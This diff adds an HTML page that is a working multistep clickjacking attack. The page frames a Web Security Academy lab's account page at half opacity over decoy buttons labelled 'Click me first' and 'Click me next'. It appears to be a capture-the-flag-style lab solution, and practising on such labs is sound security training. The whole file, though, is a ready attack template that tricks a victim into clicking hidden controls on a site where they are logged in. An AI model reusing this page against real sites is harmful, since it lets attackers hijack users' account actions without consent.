@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <style>
+        iframe{
+            position: relative;
+            width: 800px;
+            height: 560px;
+            opacity: 0.5;
+            z-index: 2;
+        }
+        #decoy_website{
+            position:absolute;
+            width:300px;
+            height:400px;
+            z-index:1;
+            top: 480px;
+            left: 35px;
+            }
+        .firstClick{
+            top: 10px;
+            height: 40px;
+        }
+        .secondClick{
+            position: absolute;
+            left: 200px;
+            width: 100px;
+            bottom: 550px;
+            height: 40px;
+        }
+        </style>
+    </head>
+
+
+<body>    
+    <div id="decoy_website">
+        <button class="firstClick" type="submit">Click me first</button>
+        <button class="secondClick" type="submit">Click me next</button>
+    </div>
+
+    <iframe src="https://0ac2000c04bd8e8b8061b7b100c7004a.web-security-academy.net/my-account"></iframe>
+</body>
+</html>
